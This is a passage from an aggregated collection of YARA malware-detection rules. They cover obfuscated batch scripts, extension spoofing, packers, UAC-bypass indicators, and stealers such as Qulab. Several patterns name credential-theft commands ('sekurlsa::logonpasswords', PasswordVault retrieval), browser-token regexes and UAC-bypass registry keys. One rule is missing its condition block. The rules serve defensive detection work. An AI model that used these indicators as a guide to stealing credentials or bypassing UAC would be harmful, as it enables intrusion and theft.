		source_url = "https://github.com/elceef/yara-rulz/blob/05834717d1464d5efce8ad9d688ff7b53886a0bb/rules/EICAR_Encrypted_ZIP.yara#L14-L44"
		license_url = "https://github.com/elceef/yara-rulz/blob/05834717d1464d5efce8ad9d688ff7b53886a0bb/LICENSE"
		logic_hash = "56851056671bde38338bd200d9fde59c042f35a2cd84ac9401e716f376c9502c"
		score = 75
		quality = 75
		tags = ""

	strings:
		$local = {
			50 4b 03 04 // local file header signature (PK)
			?? 00 // minimum version
			?? 00 // flags (bit 0 and 6 indicate encryption)
			?? 00 // compression method
			?? ?? // last modification time
			?? ?? // last modification date
			?? ?? ?? ?? // CRC-32 of uncompressed and unencrypted data
			?? ?? ?? ?? // compressed size
			?? ?? ?? ?? // uncompressed size
			}

	condition:
		for any i in ( 1 .. #local ) : ( ( uint8( @local [ i ] + 6 ) & 0x01 or uint8( @local [ i ] + 6 ) & 0x40 ) and uint32( @local [ i ] + 14 ) == 0x6851cf3c and uint32( @local [ i ] + 22 ) == 68 )
}

rule ELCEEF_BAT_Obfuscated_Setenv
{
	meta:
		description = "Detects batch script with obfuscated SET command located directly after @echo off"
		author = "marcin@ulikowski.pl"
		id = "999d192e-a792-5953-b9e2-de4b298444d3"
		date = "2023-05-01"
		modified = "2023-05-05"
		reference = "https://twitter.com/wdormann/status/1651631372438585344"
		source_url = "https://github.com/elceef/yara-rulz/blob/05834717d1464d5efce8ad9d688ff7b53886a0bb/rules/Suspicious_BAT.yara#L1-L20"
		license_url = "https://github.com/elceef/yara-rulz/blob/05834717d1464d5efce8ad9d688ff7b53886a0bb/LICENSE"
		logic_hash = "da3a2245207d79cb720079cc2bc88d5f9db22fc16601d21e7c8dcea381ed11e9"
		score = 75
		quality = 75
		tags = ""
		hash1 = "a0f43c5748ada07a12af81dda2460045030f936a8d5081f3a403f85c2a9668f8"
		hash2 = "1a0ca873412474a6437d33e48071aa0169f8317b5c996e1b10a41791707b2cf5"
		hash3 = "83e47d4f3dd43ed01dc573f0b83e9e71f0ec75b6ea5712f640585d01d8aedf3c"
		hash4 = "cf351a2b1f0a157a92be2e01e460140e2c1d0ee1685474144f2203a97d2de489"

	strings:
		$s1 = { 40 65 63 68 6f 20 6f 66 66 0d 0a ( 73 65 25 | 73 25 | 25 ) [2-26] 3a 7e [0-6] 3? 25 ( 25 | 20 | 65 25 | 74 20 | 65 74 20 ) }
		$s2 = { 40 65 63 68 6f 20 6f 66 66 0d 0a 73 65 74 20 22 [4] 3d 73 65 74 20 22 0d 0a 25 }

	condition:
		$s1 in ( 0 .. 4 ) or $s2 in ( 0 .. 4 )
}

rule ELCEEF_BAT_Chunked_Payload_Setenv
{
	meta:
		description = "Detects batch script storing chunks of payload in random environment variables"
		author = "marcin@ulikowski.pl"
		id = "18f3ddac-bc19-5b54-891e-93271d59490a"
		date = "2023-05-05"
		modified = "2024-04-10"
		reference = "https://github.com/elceef/yara-rulz"
		source_url = "https://github.com/elceef/yara-rulz/blob/05834717d1464d5efce8ad9d688ff7b53886a0bb/rules/Suspicious_BAT.yara#L22-L37"
		license_url = "https://github.com/elceef/yara-rulz/blob/05834717d1464d5efce8ad9d688ff7b53886a0bb/LICENSE"
		logic_hash = "6b202d1a5723db664c7ca689c73fc1f84365801fd56fc9a035c8d3a0b6b2b9da"
		score = 75
		quality = 75
		tags = ""
		hash1 = "f73521adbf89be99c4d7ea74ebf7fed815af49ce4dc060656d7c9c631e4d0538"

	strings:
		$echo = "@echo off"
		$set = { ( 0d 0a | 26 20 ) 73 65 74 20 22 [10] 3d [2-6] 22 }

	condition:
		$echo in ( 0 .. 4 ) and #set > 10
}

rule ELCEEF_BAT_Begin_Substring_Env
{
	meta:
		description = "Detects suspicious substring syntax at the begining of batch script"
		author = "marcin@ulikowski.pl"
		id = "3fca187b-d2e7-595c-9330-25141a54285b"
		date = "2023-06-02"
		modified = "2024-04-10"
		reference = "https://cybersecurity.att.com/blogs/labs-research/seroxen-rat-for-sale"
		source_url = "https://github.com/elceef/yara-rulz/blob/05834717d1464d5efce8ad9d688ff7b53886a0bb/rules/Suspicious_BAT.yara#L39-L55"
		license_url = "https://github.com/elceef/yara-rulz/blob/05834717d1464d5efce8ad9d688ff7b53886a0bb/LICENSE"
		logic_hash = "cc5e6e511bbc0a5cbb277ed0cbac1f2b21db8e21c4cdc802b6a1c3313d3b55cc"
		score = 65
		quality = 75
		tags = ""
		hash1 = "8ace121fae472cc7ce896c91a3f1743d5ccc8a389bc3152578c4782171c69e87"

	strings:
		$echo = "@echo off"
		$substr = { 3a 7e ( 3? 2c 3? | 2d 3? 2c 3? | 3? 2c 2d 3? | 3? 3? 2c 3? | 2d 3? 3? 2c 3? | 3? 3? 2c 2d 3? ) 25 }

	condition:
		$echo in ( 0 .. 4 ) and $substr in ( 10 .. 100 )
}

rule ELCEEF_Obfuscated_IP_Address_In_URL
{
	meta:
		description = "Detects hexadecimal and octal IP address representations in URL"
		author = "marcin@ulikowski.pl"
		id = "f2ebf5f7-5446-5eaa-8e30-90d08b8616d9"
		date = "2020-09-17"
		modified = "2024-03-04"
		reference = "https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/evasive-urls-in-spam/"
		source_url = "https://github.com/elceef/yara-rulz/blob/05834717d1464d5efce8ad9d688ff7b53886a0bb/rules/Obfuscated_IPAddr_URL.yara#L1-L17"
		license_url = "https://github.com/elceef/yara-rulz/blob/05834717d1464d5efce8ad9d688ff7b53886a0bb/LICENSE"
		logic_hash = "ab2a2a3a56e6eed9f4a3a8f994c89a167f00b86ce442820c81d8ee673b0ab85c"
		score = 75
		quality = 40
		tags = ""

	strings:
		$ = /="?http:\/\/0[0-7]{1,3}\.0[0-7]{1,3}\.0[0-7]{1,3}\.0[0-7]{1,3}\.?\// nocase ascii wide
		$ = /="?http:\/\/0x[0-9a-f]{8}\.?\// nocase ascii wide
		$ = /="?http:\/\/0x[0-9a-f]{2}\.0x[0-9a-f]{2}\.0x[0-9a-f]{2}\.0x[0-9a-f]{2}\.?\// nocase ascii wide
		$ = /="?http:\/\/[0-9]{8,10}\.?\// nocase ascii wide

	condition:
		any of them
}

rule ELCEEF_Base64_SVG_Javascript
{
	meta:
		description = "Detects base64 encoded SVG objects containing Javascript"
		author = "marcin@ulikowski.pl"
		id = "99275772-1f4f-5616-9a9c-f76b613fe143"
		date = "2022-10-25"
		modified = "2022-12-12"
		reference = "https://github.com/elceef/yara-rulz"
		source_url = "https://github.com/elceef/yara-rulz/blob/05834717d1464d5efce8ad9d688ff7b53886a0bb/rules/Base64_SVG_Javascript.yara#L1-L16"
		license_url = "https://github.com/elceef/yara-rulz/blob/05834717d1464d5efce8ad9d688ff7b53886a0bb/LICENSE"
		logic_hash = "e4cb08ccc75dc00b518c4ee1495409ae6bb99e7d493be55312b8d39aa9099cfc"
		score = 75
		quality = 75
		tags = ""
		hash1 = "fe394a59e961c3fbcc326e7d0ee5909596de55249e669bc4da0aed172c11fda8"
		hash2 = "f0c94f2705b1aea17f4a6c6d71c6ed725fe71bf66b03b0117060010859ca8a19"

	strings:
		$svg = "\"data:image/svg+xml;base64" wide ascii
		$js = "<script type=\"text/javascript\">" base64

	condition:
		all of them
}

rule GODMODERULES_IDDQD_God_Mode_Rule
{
	meta:
		description = "Detects a wide array of cyber threats, from malware and ransomware to advanced persistent threats (APTs)"
		author = "Florian Roth"
		id = "cb16ab74-1452-5898-b819-4346fea28c69"
		date = "2019-05-15"
		modified = "2024-01-12"
		reference = "Internal Research - get a god mode rule set with THOR by Nextron Systems"
		source_url = "https://github.com/Neo23x0/god-mode-rules//blob/436dc682164cf17a123d6b09d1424e7e2acf0c25/godmode.yar#L24-L69"
		license_url = "https://github.com/Neo23x0/god-mode-rules//blob/436dc682164cf17a123d6b09d1424e7e2acf0c25/LICENSE"
		logic_hash = "f2996ad7090a79c470e64c9e0ac43c2ba3fc1bf18e39686ecda9dc5b89744d7e"
		score = 60
		quality = 21
		tags = ""
		importance = 60

	strings:
		$ = "sekurlsa::logonpasswords" ascii wide nocase
		$ = "ERROR kuhl" wide xor
		$ = " -w hidden " ascii wide nocase
		$ = "Koadic." ascii
		$ = "ReflectiveLoader" fullword ascii wide xor
		$ = "%s as %s\\%s: %d" ascii xor
		$ = "[System.Convert]::FromBase64String(" ascii
		$ = "/meterpreter/" ascii xor
		$ = / -[eE][decoman]{0,41} ['"]?(JAB|SUVYI|aWV4I|SQBFAFgA|aQBlAHgA|cgBlAG)/ ascii wide
		$ = /  (sEt|SEt|SeT|sET|seT)  / ascii wide
		$ = ");iex " nocase ascii wide
		$ = "Nir Sofer" fullword wide
		$ = "impacket." ascii
		$ = /\[[\+\-!E]\] (exploit|target|vulnerab|shell|inject)/ nocase
		$ = "0000FEEDACDC}" ascii wide

rule COD3NYM_SUSP_OBF_NET_Reactor_Native_Stub_Jan24
{
	meta:
		description = "Detects native packer stub for version 4.5-4.7 of .NET Reactor. A pirated copy of version 4.5 of this commercial obfuscation solution is used by various malware families like BlackBit, RedLine, AgentTesla etc."
		author = "Jonathan Peters"
		id = "529dce88-a81d-5a98-aa6c-1f1b739ad074"
		date = "2024-01-05"
		modified = "2024-01-12"
		reference = "https://notes.netbytesec.com/2023/08/understand-ransomware-ttps-blackbit.html"
		source_url = "https://github.com/cod3nym/detection-rules//blob/ad485bff0ce30afb56e367b7f2b76fea81e78fc9/yara/dotnet/obf_net_reactor.yar#L3-L16"
		license_url = "https://github.com/cod3nym/detection-rules//blob/ad485bff0ce30afb56e367b7f2b76fea81e78fc9/LICENSE.md"
		hash = "6e8a7adf680bede7b8429a18815c232004057607fdfbf0f4b0fb1deba71c5df7"
		logic_hash = "287273babd3cd6bc1986b018367317019f2249851a2c19fc83857f7ff0b90b54"
		score = 70
		quality = 80
		tags = ""

	strings:
		$op = {C6 44 24 18 E0 C6 44 24 19 3B C6 44 24 1A 8D C6 44 24 1B 2A C6 44 24 1C A2 C6 44 24 1D 2A C6 44 24 1E 2A C6 44 24 1F 41 C6 44 24 20 D3 C6 44 24 21 20 C6 44 24 22 64 C6 44 24 23 06 C6 44 24 24 8A C6 44 24 25 F7 C6 44 24 26 3D C6 44 24 27 9D C6 44 24 28 D9 C6 44 24 29 EE C6 44 24 2A 15 C6 44 24 2B 68 C6 44 24 2C F4 C6 44 24 2D 76 C6 44 24 2E B9 C6 44 24 2F 34 C6 44 24 30 BF C6 44 24 31 1E C6 44 24 32 E7 C6 44 24 33 78 C6 44 24 34 98 C6 44 24 35 E9 C6 44 24 36 6F C6 44 24 37 B4}

	condition:
		for any i in ( 0 .. pe.number_of_resources -1 ) : ( pe.resources [ i ] . name_string == "_\x00_\x00" ) and $op
}

rule COD3NYM_SUSP_OBF_Pyarmor_Jan24
{
	meta:
		description = "Detects PyArmor python code obfuscation. PyArmor is used by various threat actors like BatLoader"
		author = "Jonathan Peters"
		id = "2627c764-57ed-5781-8c77-ad2d9f4bd0ee"
		date = "2024-01-16"
		modified = "2024-01-16"
		reference = "https://www.trendmicro.com/en_us/research/23/h/batloader-campaigns-use-pyarmor-pro-for-evasion.html"
		source_url = "https://github.com/cod3nym/detection-rules//blob/ad485bff0ce30afb56e367b7f2b76fea81e78fc9/yara/other/susp_obf_pyarmor.yar#L1-L18"
		license_url = "https://github.com/cod3nym/detection-rules//blob/ad485bff0ce30afb56e367b7f2b76fea81e78fc9/LICENSE.md"
		hash = "2727a418f31e8c0841f8c3e79455067798a1c11c2b83b5c74d2de4fb3476b654"
		logic_hash = "6bbbe4c9ad54a1d1042b53803ca6011f3eaaeebbe864703e741c25a0d788342f"
		score = 65
		quality = 80
		tags = ""

	strings:
		$ = "__pyarmor__" ascii
		$ = "pyarmor_runtime" ascii
		$ = "pyarmor(__" ascii
		$ = { 50 79 61 72 6D 6F 72 20 [5] 20 28 70 72 6F 29 }
		$ = { 5F 5F 61 72 6D 6F 72 5F ( 65 78 69 74 | 77 72 61 70 | 65 6E 74 65 72 ) 5F 5F }

	condition:
		2 of them
}

rule COD3NYM_SUSP_RLO_Exe_Extension_Spoofing_Jan24
{
	meta:
		description = "Detects Right-To-Left (RLO) Unicode (U+202E) extension spoofing for .exe files"
		author = "Jonathan Peters"
		id = "60c1a8db-6bfc-547b-98d9-21c198a703f0"
		date = "2024-01-14"
		modified = "2024-02-19"
		reference = "https://unprotect.it/technique/right-to-left-override-rlo-extension-spoofing/"
		source_url = "https://github.com/cod3nym/detection-rules//blob/ad485bff0ce30afb56e367b7f2b76fea81e78fc9/yara/other/susp_rlo_exe_extension_spoofing.yar#L2-L58"
		license_url = "https://github.com/cod3nym/detection-rules//blob/ad485bff0ce30afb56e367b7f2b76fea81e78fc9/LICENSE.md"
		hash = "cae0ab10f7c1afd7941aff767a9b59901270e3de4d44167e932dae0991515487"
		logic_hash = "6126f36b3cd695b4002c29c9163faa6ec295699863d8db7fe17afc407f5a5736"
		score = 70
		quality = 55
		tags = ""

	strings:
		$ = { E2 80 AE 76 73 63 ( 2E 2E | 2E ) ( 65 78 65 | 73 63 72 ) }
		$ = { E2 80 AE 66 64 70 ( 2E 2E | 2E ) ( 65 78 65 | 73 63 72 ) }
		$ = { E2 80 AE 78 73 6C 78 ( 2E 2E | 2E ) ( 65 78 65 | 73 63 72 ) }
		$ = { E2 80 AE 78 63 6F 64 ( 2E 2E | 2E ) ( 65 78 65 | 73 63 72 ) }
		$ = { E2 80 AE 70 69 7A ( 2E 2E | 2E ) ( 65 78 65 | 73 63 72 ) }
		$ = { E2 80 AE 67 6E 70 ( 2E 2E | 2E ) ( 65 78 65 | 73 63 72 ) }
		$ = { E2 80 AE 67 65 70 6A ( 2E 2E | 2E ) ( 65 78 65 | 73 63 72 ) }
		$ = { E2 80 AE 67 70 6A ( 2E 2E | 2E ) ( 65 78 65 | 73 63 72 ) }
		$ = { E2 80 AE 6E 6C 73 ( 2E 2E | 2E ) ( 65 78 65 | 73 63 72 ) }
		$ = { E2 80 AE 74 78 74 ( 2E 2E | 2E ) ( 65 78 65 | 73 63 72 ) }
		$ = { E2 80 AE 66 64 70 ( 2E 2E | 2E ) ( 65 78 65 | 73 63 72 ) }
		$ = { E2 80 AE 78 74 70 70 ( 2E 2E | 2E ) ( 65 78 65 | 73 63 72 ) }
		$ = { E2 80 AE 74 64 6f ( 2E 2E | 2E ) ( 65 78 65 | 73 63 72 ) }
		$ = { E2 80 AE 63 74 65 ( 2E 2E | 2E ) ( 65 78 65 | 73 63 72 ) }
		$ = { E2 80 AE 66 69 67 ( 2E 2E | 2E ) ( 65 78 65 | 73 63 72 ) }
		$ = { E2 80 AE 70 6d 62 ( 2E 2E | 2E ) ( 65 78 65 | 73 63 72 ) }
		$ = { E2 80 AE 66 66 69 74 ( 2E 2E | 2E ) ( 65 78 65 | 73 63 72 ) }
		$ = { E2 80 AE 67 76 73 ( 2E 2E | 2E ) ( 65 78 65 | 73 63 72 ) }
		$ = { E2 80 AE 34 70 6d ( 2E 2E | 2E ) ( 65 78 65 | 73 63 72 ) }
		$ = { E2 80 AE 69 76 61 ( 2E 2E | 2E ) ( 65 78 65 | 73 63 72 ) }
		$ = { E2 80 AE 76 6f 6d ( 2E 2E | 2E ) ( 65 78 65 | 73 63 72 ) }
		$ = { E2 80 AE 76 6d 77 ( 2E 2E | 2E ) ( 65 78 65 | 73 63 72 ) }
		$ = { E2 80 AE 76 6c 66 ( 2E 2E | 2E ) ( 65 78 65 | 73 63 72 ) }
		$ = { E2 80 AE 76 6b 6d ( 2E 2E | 2E ) ( 65 78 65 | 73 63 72 ) }
		$ = { E2 80 AE 33 70 6d ( 2E 2E | 2E ) ( 65 78 65 | 73 63 72 ) }
		$ = { E2 80 AE 76 61 77 ( 2E 2E | 2E ) ( 65 78 65 | 73 63 72 ) }
		$ = { E2 80 AE 63 61 61 ( 2E 2E | 2E ) ( 65 78 65 | 73 63 72 ) }
		$ = { E2 80 AE 63 61 6c 66 ( 2E 2E | 2E ) ( 65 78 65 | 73 63 72 ) }
		$ = { E2 80 AE 67 67 6f ( 2E 2E | 2E ) ( 65 78 65 | 73 63 72 ) }
		$ = { E2 80 AE 61 6d 77 ( 2E 2E | 2E ) ( 65 78 65 | 73 63 72 ) }
		$ = { E2 80 AE 72 61 72 ( 2E 2E | 2E ) ( 65 78 65 | 73 63 72 ) }
		$ = { E2 80 AE 7a 37 ( 2E 2E | 2E ) ( 65 78 65 | 73 63 72 ) }
		$ = { E2 80 AE 7a 67 72 61 74 ( 2E 2E | 2E ) ( 65 78 65 | 73 63 72 ) }
		$ = { E2 80 AE 6f 73 69 ( 2E 2E | 2E ) ( 65 78 65 | 73 63 72 ) }
		$ = { E2 80 AE 6c 6d 74 68 ( 2E 2E | 2E ) ( 65 78 65 | 73 63 72 ) }
		$ = { E2 80 AE 6c 6d 65 ( 2E 2E | 2E ) ( 65 78 65 | 73 63 72 ) }
		$ = { E2 80 AE 6d 74 68 ( 2E 2E | 2E ) ( 65 78 65 | 73 63 72 ) }
		$ = { E2 80 AE 66 74 72 ( 2E 2E | 2E ) ( 65 78 65 | 73 63 72 ) }
		$ = { E2 80 AE 6d 68 63 ( 2E 2E | 2E ) ( 65 78 65 | 73 63 72 ) }
		$ = { E2 80 AE 61 74 68 ( 2E 2E | 2E ) ( 65 78 65 | 73 63 72 ) }
		$ = { E2 80 AE 6b 6e 6c ( 2E 2E | 2E ) ( 65 78 65 | 73 63 72 ) }
		$ = { E2 80 AE 73 6c 78 ( 2E 2E | 2E ) ( 65 78 65 | 73 63 72 ) }
		$ = { E2 80 AE 63 6f 64 ( 2E 2E | 2E ) ( 65 78 65 | 73 63 72 ) }
		$ = { E2 80 AE 6d 63 6f 64 ( 2E 2E | 2E ) ( 65 78 65 | 73 63 72 ) }

	condition:
		1 of them
}

rule CRAIU_Susp_Ios_Shutdown
{
	meta:
		description = "Detect shutdown.log files from sysdiags with suspicious entries"
		author = "Costin G. Raiu, Art of Noh, craiu@noh.ro"
		id = "08aa1fb9-7af0-515a-91a8-09ed35e48155"
		date = "2023-12-28"
		modified = "2024-03-05"
		reference = "https://securelist.com/shutdown-log-lightweight-ios-malware-detection-method/111734/"
		source_url = "https://github.com/craiu/yararules/blob/23cf0ca22021fa3684e180a18416b9ae1b695243/files/susp_ios_shutdown.yara#L2-L25"
		license_url = "https://github.com/craiu/yararules/blob/23cf0ca22021fa3684e180a18416b9ae1b695243/LICENSE"
		logic_hash = "936101f2dddb73f6dda41be47d775199c458aa4fecdcf348ed479da620343ea1"
		score = 65
		quality = 85
		tags = ""
		version = "1.0"
		tlp = "TLP:CLEAR"

	strings:
		$a1 = "these clients are still here:"
		$b1 = "/private/var/db/"
		$b2 = "/private/var/tmp/"
		$c1 = "After "

	condition:
		($c1 at 0 ) and $a1 and ( any of ( $b* ) )
}

rule DITEKSHEN_INDICATOR_SUSPICIOUS_PWSH_Passwordcredential_Retrievepassword
{
	meta:
		description = "Detects PowerShell content designed to retrieve passwords from host"
		author = "ditekSHen"
		id = "b34599ab-b874-5ea5-990d-bc7593bb08b5"
		date = "2024-06-08"
		modified = "2024-06-08"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_suspicious.yar#L1048-L1058"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "f09320d9c4734579a535c7fee993fa076974b13ffd25e0d9ab02bc09663595f8"
		score = 40
		quality = 39
		tags = ""
		importance = 20

	strings:
		$namespace = "Windows.Security.Credentials.PasswordVault" ascii wide nocase
		$method1 = "RetrieveAll()" ascii wide nocase
		$method2 = ".RetrievePassword()" ascii wide nocase

	condition:
		$namespace and 1 of ( $method* )
}

rule DITEKSHEN_INDICATOR_SUSPICIOUS_EXE_Uacbypass_Envvarscheduledtasks
{
	meta:
		description = "detects Windows exceutables potentially bypassing UAC (ab)using Environment Variables in Scheduled Tasks"
		author = "ditekSHen"
		id = "14244310-e524-54bf-8822-9b953378bb75"
		date = "2024-06-08"
		modified = "2024-06-08"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_suspicious.yar#L1070-L1081"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "dacca794aefd66526535a87c8890c0ad65550ff88bc0242f05c84c9452a31fe2"
		score = 40
		quality = 45
		tags = ""
		importance = 20

	strings:
		$s1 = "\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup" ascii wide
		$s2 = "\\Environment" ascii wide
		$s3 = "schtasks" ascii wide
		$s4 = "/v windir" ascii wide

	condition:
		all of them
}

rule DITEKSHEN_INDICATOR_SUSPICIOUS_EXE_Uacbypass_Fodhelper
{
	meta:
		description = "detects Windows exceutables potentially bypassing UAC using fodhelper.exe"
		author = "ditekSHen"
		id = "0651e428-a2ef-508d-ad89-c68ac758808f"
		date = "2024-06-08"
		modified = "2024-06-08"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_suspicious.yar#L1083-L1094"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "ec41ca2185732e418825f7c32095dea361a53e586e498baf4c17eaaf9602ba5e"
		score = 40
		quality = 43
		tags = ""
		importance = 20

	strings:
		$s1 = "\\software\\classes\\ms-settings\\shell\\open\\command" ascii wide nocase
		$s2 = "DelegateExecute" ascii wide
		$s3 = "fodhelper" ascii wide
		$s4 = "ConsentPromptBehaviorAdmin" ascii wide

	condition:
		all of them
}

rule DITEKSHEN_INDICATOR_SUSPICIOUS_Finger_Download_Pattern
{
	meta:
		description = "Detects files embedding and abusing the finger command for download"
		author = "ditekSHen"
		id = "6647b410-c8f0-596b-95d7-dbc6a951a83f"
		date = "2024-06-08"
		modified = "2024-06-08"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_suspicious.yar#L1108-L1118"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "04cbb1abc4c3d2990bae798ece052eb8aa1b5104b5712e98aeb80731316b9c57"
		score = 40
		quality = 20
		tags = ""
		importance = 20

	strings:
		$pat1 = /finger(\.exe)?\s.{1,50}@.{7,10}\|/ ascii wide
		$pat2 = "-Command \"finger" ascii wide
		$ne1 = "Nmap service detection probe list" ascii

	condition:
		not any of ( $ne* ) and any of ( $pat* )
}

rule DITEKSHEN_INDICATOR_SUSPICIOUS_JS_WMI_Execquery
{
	meta:
		description = "Detects JS potentially executing WMI queries"
		author = "ditekSHen"
		id = "28f37b24-8bf3-5f5c-af47-dc6da5f6397a"
		date = "2024-06-08"
		modified = "2024-06-08"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_suspicious.yar#L1135-L1147"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "e5145aa3a7ce54cda84929f6806a1d7b1cb37db729bb932c5c76994fb683250e"
		score = 40
		quality = 45
		tags = ""
		importance = 20

	strings:
		$ex = ".ExecQuery(" ascii nocase
		$s1 = "GetObject(" ascii nocase
		$s2 = "String.fromCharCode(" ascii nocase
		$s3 = "ActiveXObject(" ascii nocase
		$s4 = ".Sleep(" ascii nocase

	condition:
		($ex and all of ( $s* ) )
}

rule DITEKSHEN_INDICATOR_SUSPICIOUS_PWS_Capturescreenshot
{
	meta:
		description = "Detects PowerShell script with screenshot capture capability"
		author = "ditekSHen"
		id = "d769936a-a81d-5052-8b1b-7bd5a73b41db"
		date = "2024-06-08"
		modified = "2024-06-08"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_suspicious.yar#L2367-L2379"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "26e02d7dc242fb2c913b3a7c07e92c84becad62a4cdbae781bce948bfe0eb81b"
		score = 40
		quality = 45
		tags = ""
		importance = 20

	strings:
		$encoder = ".ImageCodecInfo]::GetImageEncoders(" ascii nocase
		$capture1 = ".Sendkeys]::SendWait(\"{PrtSc}\")" ascii nocase
		$capture2 = ".Sendkeys]::SendWait('{PrtSc}')" ascii nocase
		$access = ".Clipboard]::GetImage(" ascii nocase
		$save = ".Save(" ascii nocase

	condition:
		$encoder and ( 1 of ( $capture* ) and ( $access or $save ) )
}

rule DITEKSHEN_INDICATOR_SUSPICIOUS_PWS_Capturebrowserplugins
{
	meta:
		description = "Detects PowerShell script with browser plugins capture capability"
		author = "ditekSHen"
		id = "9b1bb195-6e32-5f93-ba70-efcb21b26bb0"
		date = "2024-06-08"
		modified = "2024-06-08"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_suspicious.yar#L2381-L2394"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "ac7be8663507e96ecb224f7f09f9092069eab5967598e33c107fa341de86bc77"
		score = 40
		quality = 45
		tags = ""
		importance = 20

	strings:
		$s1 = "$env:APPDATA +" ascii nocase
		$s2 = "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}|mfa\\.[\\w-]{84}" ascii nocase
		$s3 = "\\leveldb" ascii nocase
		$o1 = ".Match(" ascii nocase
		$o2 = ".Contains(" ascii nocase
		$o3 = ".Add(" ascii nocase

	condition:
		2 of ( $s* ) and 2 of ( $o* )
}

rule DITEKSHEN_INDICATOR_OLE_Remotetemplate
{
	meta:
		description = "Detects XML relations where an OLE object is refrencing an external target in dropper OOXML documents"
		author = "ditekSHen"
		id = "fbf40436-fc0a-5e55-89ac-5e1dd93e1833"
		date = "2024-09-06"
		modified = "2024-09-06"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_office.yar#L691-L702"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "80cc5b1a8a8899f632401956055374d265c734449e56ffeee5f0ba4911050f36"
		score = 75
		quality = 75
		tags = ""

	strings:
		$olerel = "relationships/oleObject" ascii
		$target1 = "Target=\"http" ascii
		$target2 = "Target=\"file" ascii
		$mode = "TargetMode=\"External" ascii

	condition:
		$olerel and $mode and 1 of ( $target* )
}

rule DITEKSHEN_INDICATOR_JAVA_Packed_Allatori
{
	meta:
		description = "Detects files packed with Allatori Java Obfuscator"
		author = "ditekSHen"
		id = "16b9f455-ba73-5f09-9822-8349c53fa965"
		date = "2023-08-29"
		modified = "2023-08-29"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_packed.yar#L113-L121"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "ac48a573eb9d9fffe38d09993ff062f308edb07b8a7498e332cc3eb501d48db7"
		score = 75
		quality = 75
		tags = ""
		importance = 20

	strings:
		$s1 = "# Obfuscation by Allatori Obfuscator" ascii wide

	condition:
		all of them
}

rule DITEKSHEN_MALWARE_Win_Qulab
{
	meta:
		description = "Qulab information stealer payload or artifacts"
		author = "ditekSHen"
		id = "6ae24c67-5700-5330-a3bd-d542162faebb"
		date = "2024-11-01"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L959-L983"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "659d828cbef38c6362b612be9bdc05ae820f49c23684e77af6462ea677133284"
		score = 75
		quality = 75
		tags = ""
		clamav_sig = "MALWARE.Win.Trojan.QulabZ-Stealer"

	strings:
		$x1 = "QULAB CLIPPER + STEALER" ascii wide
		$x2 = "MASAD CLIPPER + STEALER" ascii wide
		$x3 = "http://teleg.run/Qulab" ascii wide
		$x4 = "http://teleg.run/jew_seller" ascii wide
		$x5 = "BUY CLIPPER + STEALER" ascii wide
		$s1 = "\\Screen.jpg" ascii wide
		$s2 = "attrib +s +h \"" ascii wide
		$s3 = "\\x86_microsoft-windows-" ascii wide
		$s4 = "\\amd64_microsoft-windows-" ascii wide
		$s5 = "Desktop TXT File" ascii wide
		$s6 = "\\AutoFills.txt" ascii wide
		$s7 = "\\CreditCards.txt" ascii wide
		$s8 = "a -y -mx9 -ssw" ascii wide
		$s9 = "\\Passwords.txt" ascii wide
		$s10 = "\\Information.txt" ascii wide
		$s11 = "\\getMe" ascii wide

	condition:
		9 of them or ( ( 1 of ( $x* ) and 4 of ( $s* ) ) or 1 of ( $x* ) )
}

rule DITEKSHEN_MALWARE_JS_Koadicjs
{
	meta:
		description = "Koadic post-exploitation framework JS payload"
		author = "ditekSHen"
		id = "8598d5cb-0486-52b0-a686-6bd014f35c44"
		date = "2024-11-01"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
